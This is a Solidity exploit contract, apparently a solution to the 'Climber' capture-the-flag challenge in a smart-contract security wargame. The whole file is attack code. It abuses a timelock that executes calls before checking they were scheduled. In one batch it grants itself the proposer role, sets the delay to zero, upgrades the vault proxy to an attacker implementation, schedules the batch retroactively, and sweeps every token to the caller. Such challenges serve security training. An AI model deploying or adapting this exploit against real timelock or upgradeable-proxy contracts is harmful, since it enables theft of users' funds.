// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVaultVulnerable.sol";

contract ClimberAttacker {
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;

    ClimberTimelock climberTimelock;

    constructor(address payable _climberTimelock) {
        climberTimelock = ClimberTimelock(_climberTimelock);
    }

    function attack(
        address _vaultProxy,
        address _vulnerableVault,
        address _tokenAddress
    ) external {
        salt = "salt";

        // grant proposer role to the attacker contract
        targets.push(address(climberTimelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        // set execution delay to 0
        targets.push(address(climberTimelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));

        // upgrade vault to vulnerable version
        targets.push(address(_vaultProxy));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "upgradeTo(address)",
                address(_vulnerableVault)
            )
        );

        // schedule above actions
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("schedule()"));

        climberTimelock.execute(targets, values, dataElements, salt);

        // get all founds from the vault address
        ClimberVaultVulnerable(_vaultProxy).sweepFunds(
            _tokenAddress,
            msg.sender
        );
    }

    function schedule() external {
        climberTimelock.schedule(targets, values, dataElements, salt);
    }

    receive() external payable {}
}
